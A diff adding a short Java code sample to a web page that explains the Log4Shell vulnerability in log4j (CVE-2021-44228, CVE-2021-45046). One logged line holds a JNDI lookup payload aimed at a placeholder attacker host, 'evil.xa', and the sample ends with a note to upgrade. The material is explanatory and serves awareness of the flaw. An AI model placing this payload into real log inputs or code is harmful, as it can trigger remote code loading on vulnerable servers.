@@ -16,5 +16,21 @@ Don't hesitate to share your feedback.
 
 ### Articles
 
+### Code sample
 
+{% highlight java %}
+import org.apache.log4j.LogManager;
+import org.apache.log4j.Logger;
 
+public class Log4Shell {
+    protected static final Logger LOGGER = LogManager.getLogger(Log4Shell.class);
+
+    public void log4ShellExplained() {
+        LOGGER.warn("log4j <= 2.15.0 zero-day exploit");
+        LOGGER.warn("Reported vulnerabilities CVE-2021-44228 and CVE-2021-45046");
+        // Critical vulnerability exploit
+        LOGGER.fatal("${jndi:ldap://evil.xa/x}");
+        LOGGER.info("Upgrade to log4j 2.16.0");
+    }
+}
+{% endhighlight %}
